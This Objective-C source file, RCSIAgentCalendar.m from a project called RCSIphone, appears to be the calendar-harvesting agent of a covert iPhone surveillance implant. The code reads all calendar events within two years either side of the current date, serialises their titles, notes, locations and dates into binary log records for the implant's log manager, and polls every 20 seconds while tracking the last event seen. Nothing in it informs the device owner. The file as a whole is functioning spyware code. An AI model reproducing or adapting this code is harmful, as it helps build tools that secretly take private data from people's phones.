//
//  RCSIAgentCalendar.m
//  RCSIphone
//
//  Created by kiodo on 04/08/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "RCSIAgentCalendar.h"
#import "RCSICommon.h"
#import "EventKit.h"
#import "RCSILogManager.h"

//#define DEBUG_CAL

static RCSIAgentCalendar *sharedAgentCalendar = nil;
NSDate *gStartDate, *gEndDate;

@implementation RCSIAgentCalendar

@synthesize mAgentConfiguration;

- (BOOL)_setAgentMessagesProperty
{
  NSAutoreleasePool *pool   = [[NSAutoreleasePool alloc] init];
  
  NSDictionary *eventDateDict = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: [NSNumber numberWithDouble: mLastEvent], nil] 
                                                              forKeys: [NSArray arrayWithObjects: @"LAST_EVENT_DATE", nil]];
  
  NSDictionary *agentDict     = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: eventDateDict, nil]
                                                              forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  setRcsPropertyWithName([[self class] description], agentDict);
  
  [agentDict release];
  [eventDateDict release];
   
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentMessagesProperty
{
  NSDictionary *agentDict = nil;

  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  agentDict = rcsPropertyWithName([[self class] description]);

  if (agentDict == nil) 
    {
#ifdef DEBUG_CAL
      NSLog(@"%s: getting prop failed!", __FUNCTION__);
#endif
      return YES;
    }

  NSNumber *lastEventDate = (NSNumber*)[agentDict objectForKey: @"LAST_EVENT_DATE"];


  mLastEvent = [lastEventDate doubleValue];

#ifdef DEBUG_CAL
  NSLog(@"%s: mLastEvent value 0x%f", __FUNCTION__, mLastEvent);
#endif

  [outerPool release];

  return YES;
}

- (id)init
{
  Class myClass = [self class];

  @synchronized(myClass)
    {
      if (sharedAgentCalendar != nil)
        {
          self = [super init];
          if (self) 
            mLastEvent = 0;
        }
    }

  return sharedAgentCalendar;
}

- (NSDate*)initStartDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  CFGregorianDate gregorianStartDate;
  CFGregorianUnits startUnits = {0, 0, -730, 0, 0, 0};
  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
  
  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                      timeZone, 
                                                                                      startUnits),
                                                      timeZone);
  gregorianStartDate.hour = 0;
  gregorianStartDate.minute = 0;
  gregorianStartDate.second = 0;
  
  
  NSDate *theDate =
  [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianStartDate, timeZone)];
  
  [theDate retain];
  
  CFRelease(timeZone);
  
  [pool release];
  
  return theDate;
}

- (NSDate*)initEndDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  CFGregorianDate gregorianEndDate;
  CFGregorianUnits endUnits = {0, 0, 730, 0, 0, 0};
  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();
  
  
  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                    timeZone, 
                                                                                    endUnits),
                                                    timeZone);
  gregorianEndDate.hour = 0;
  gregorianEndDate.minute = 0;
  gregorianEndDate.second = 0;

  NSDate *theDate =
  [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianEndDate, timeZone)];
  
  [theDate retain];
  
  CFRelease(timeZone);
  
  [pool release];
  
  return theDate;
  
}

- (void)calcStartAndEndDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  CFGregorianDate gregorianStartDate, gregorianEndDate;
  CFGregorianUnits startUnits = {0, 0, -730, 0, 0, 0};
  CFGregorianUnits endUnits = {0, 0, 730, 0, 0, 0};
  CFTimeZoneRef timeZone = CFTimeZoneCopySystem();

  gregorianStartDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                      timeZone, 
                                                                                      startUnits),
                                                      timeZone);
  gregorianStartDate.hour = 0;
  gregorianStartDate.minute = 0;
  gregorianStartDate.second = 0;

  gregorianEndDate = CFAbsoluteTimeGetGregorianDate(CFAbsoluteTimeAddGregorianUnits(CFAbsoluteTimeGetCurrent(), 
                                                                                    timeZone, 
                                                                                    endUnits),
                                                    timeZone);
  gregorianEndDate.hour = 0;
  gregorianEndDate.minute = 0;
  gregorianEndDate.second = 0;

  gStartDate =
    [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianStartDate, timeZone)];
  gEndDate =
    [NSDate dateWithTimeIntervalSinceReferenceDate:CFGregorianDateGetAbsoluteTime(gregorianEndDate, timeZone)];

  [gStartDate retain];
  [gEndDate retain];

  CFRelease(timeZone);

  [pool release];
}

- (void)writeCalLog: (EKEvent*)anEvent
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  UInt32 prefix = 0;
  UInt32 outLength = 0;
  HeaderStruct header;
  HeaderStruct *tmpHeader = NULL;
  PoomCalendar calStruct;

  NSMutableData *calData = [[NSMutableData alloc] initWithCapacity: 0];

  memset(&header, 0, sizeof(HeaderStruct));
  memset(&calStruct, 0, sizeof(PoomCalendar));

  header.dwVersion = POOM_V1_0_PROTO;
  outLength = sizeof(HeaderStruct);

  // FLAGS + StartDate + EndDate + 5 Long
  outLength += sizeof(calStruct);

  int64_t filetime = ((int64_t)[[anEvent startDate] timeIntervalSince1970] * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  calStruct._ftStartDateHi = filetime >> 32;
  calStruct._ftStartDateLo = filetime & 0xFFFFFFFF;

  filetime = ((int64_t)[[anEvent endDate] timeIntervalSince1970] * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
  calStruct._ftEndDateHi = filetime >> 32;
  calStruct._ftEndDateLo = filetime & 0xFFFFFFFF;

#ifdef DEBUG_CAL
  NSLog(@"%s startDate %@, endDate %@", __FUNCTION__, [anEvent startDate], [anEvent endDate]);
#endif

  [calData appendBytes: (const void *) &header length: sizeof(header)];
  [calData appendBytes: (const void *) &calStruct length:sizeof(PoomCalendar)];

  // Recursive
  // memcpy_s(pPtr, sizeof(RecurStruct), calendar->GetRecurStruct(), sizeof(RecurStruct));

  //POOM_STRING_SUBJECT
  if ([anEvent title]) 
    {
      char * tmpString = (char*)[[anEvent title] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];

      if (tmpString) 
        {
          UInt32 tmpLen = [[anEvent title] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

          outLength += sizeof(UInt32);

          outLength += tmpLen;

          prefix = tmpLen;

          prefix &= POOM_TYPE_MASK;    
          prefix |= (UInt32)POOM_STRING_SUBJECT; 

          [calData appendBytes: &prefix length: sizeof(UInt32)];
          [calData appendBytes: tmpString length: tmpLen];
        }
    }

  //POOM_STRING_CATEGORIES
  //prefix = 0;
  //prefix &= POOM_TYPE_MASK;    
  //prefix |= (UInt32)POOM_STRING_CATEGORIES;

  //POOM_STRING_BODY
  if ([anEvent notes]) 
    {
      char * tmpString = (char*)[[anEvent notes] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];

      if (tmpString) 
        {
          UInt32 tmpLen = [[anEvent notes] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

          outLength += sizeof(UInt32);
          outLength += tmpLen;

          prefix = tmpLen;

          prefix &= POOM_TYPE_MASK;    
          prefix |= (UInt32)POOM_STRING_BODY; 

          [calData appendBytes: &prefix length: sizeof(UInt32)];
          [calData appendBytes: tmpString length: tmpLen];
        }
    }

  //POOM_STRING_RECIPIENTS
  //prefix = 0;
  //prefix &= POOM_TYPE_MASK;    
  //prefix |= (UInt32)POOM_STRING_RECIPIENTS;

  //POOM_STRING_LOCATION
  if ([anEvent location]) 
    {
      char * tmpString = (char*)[[anEvent location] cStringUsingEncoding: NSUTF16LittleEndianStringEncoding];

      if (tmpString) 
        {
          UInt32 tmpLen = [[anEvent location] lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];

          outLength += sizeof(UInt32);
          outLength += tmpLen;

          prefix = tmpLen;

          prefix &= POOM_TYPE_MASK;    
          prefix |= (UInt32)POOM_STRING_LOCATION; 

          [calData appendBytes: &prefix length: sizeof(UInt32)];
          [calData appendBytes: tmpString length: tmpLen];
        }
    }

  // Setting total length
  tmpHeader = (HeaderStruct *) [calData bytes];  
  tmpHeader->dwSize = outLength;

  // No additional param header required
  RCSILogManager *logManager = [RCSILogManager sharedInstance];

  BOOL success = [logManager createLog: LOG_CALENDAR
                           agentHeader: nil
                             withLogID: 0];
  // Write data to log
  if (success == TRUE && [logManager writeDataToLog: calData
                                           forAgent: LOG_CALENDAR
                                          withLogID: 0] == TRUE)
    {
#ifdef DEBUG_CAL
      NSLog(@"%s: writeDataToLog success", __FUNCTION__);
#endif

      [logManager closeActiveLog: LOG_CALENDAR withLogID: 0];

      if ([[anEvent lastModifiedDate] timeIntervalSince1970] > mLastEvent)
        {
          mLastEvent = [[anEvent lastModifiedDate] timeIntervalSince1970];
          [self _setAgentMessagesProperty];
#ifdef DEBUG_CAL
          NSLog(@"%s: mLastEvent value 0x%f", __FUNCTION__, mLastEvent);
#endif
        }
    }

  [calData release];

  [pool release];
}

- (NSArray*)getEvents: (NSDate*)startDate
               toDate: (NSDate*)endDate
{
  EKEventStore *eStore = [[EKEventStore alloc] init];

  NSPredicate *predicate = [eStore predicateForEventsWithStartDate:startDate endDate:endDate calendars:nil];

  NSArray *events = [eStore eventsMatchingPredicate: predicate];

  [eStore release];

  return events;
}

- (void)parseCalEvents: (BOOL)allEvents withStartDate:(NSDate*)startDate andEndDate:(NSDate*)endDate
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  UIDevice *device;

  device = [UIDevice currentDevice];

  NSString *majVer = [[device systemVersion] substringToIndex:1];

  if ([majVer compare: @"3"] == NSOrderedSame) 
    {
      [pool release];
      return;
    }

  NSArray *events = [self getEvents: startDate toDate: endDate];

  if (events) 
    {
      for (int i=0; i < [events count]; i++) 
        {
          EKEvent *currEvent = (EKEvent*)[events objectAtIndex: i];

          NSTimeInterval currDate = [[currEvent lastModifiedDate] timeIntervalSince1970];

          if (currDate > mLastEvent || allEvents) 
            {
              [self writeCalLog: currEvent];
            }
        } 
    }

  [pool release];
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSDate *startDate, *endDate;

  //[self calcStartAndEndDate];
  startDate = [self initStartDate];
  endDate   = [self initEndDate];
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];

  [self _getAgentMessagesProperty];

  if (mLastEvent == 0) 
    {
      mLastEvent = [[NSDate dateWithTimeIntervalSince1970:0] timeIntervalSince1970];
      [self parseCalEvents: YES withStartDate:startDate andEndDate:endDate];
    }

  while([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
        [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      [self parseCalEvents: NO withStartDate:startDate andEndDate:endDate];

      for (int i=0; i<20; i++) 
        {
          sleep(1);
          if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
            break;
        }

      [innerPool release];
    }

  [mAgentConfiguration setObject: AGENT_STOPPED
                          forKey: @"status"];

  [startDate release];
  [endDate release];

  [mAgentConfiguration release];
  mAgentConfiguration = nil;
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;

  // Already set by Agent AddressBook: not mandatory...
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];

  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= 5)
    {
      internalCounter++;
      sleep(1);
    }

 return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

+ (RCSIAgentCalendar *)sharedInstance
{
  @synchronized(self)
    {
      if (sharedAgentCalendar == nil)
        {
          //
          // Assignment is not done here
          //
          [[self alloc] init];
        }
    }

  return sharedAgentCalendar;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
    {
      if (sharedAgentCalendar == nil)
        {
          sharedAgentCalendar = [super allocWithZone: aZone];

          //
          // Assignment and return on first allocation
          //
          return sharedAgentCalendar;
        }
    }

  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

//    EKRecurrenceRule *recRule = [currEvent recurrenceRule];
//    
//    if (recRule) 
//    {
//      switch([recRule frequency])
//      {
//        case EKRecurrenceFrequencyDaily:
//#ifdef DEBUG_CAL 
//          NSLog(@"%s: frequency daily", __FUNCTION__);
//#endif
//        break;
//        case EKRecurrenceFrequencyWeekly:
//#ifdef DEBUG_CAL 
//          NSLog(@"%s: frequency weekly", __FUNCTION__);
//#endif
//        break;
//        case EKRecurrenceFrequencyMonthly:
//#ifdef DEBUG_CAL
//          NSLog(@"%s: frequency Monthly", __FUNCTION__);
//#endif
//        break;
//        case EKRecurrenceFrequencyYearly:
//#ifdef DEBUG_CAL 
//          NSLog(@"%s: frequency Yearly", __FUNCTION__);
//#endif
//        break;
//      }
//      
//      NSLog(@"%s: interval %d", __FUNCTION__, [recRule interval]);      
//    }

@end
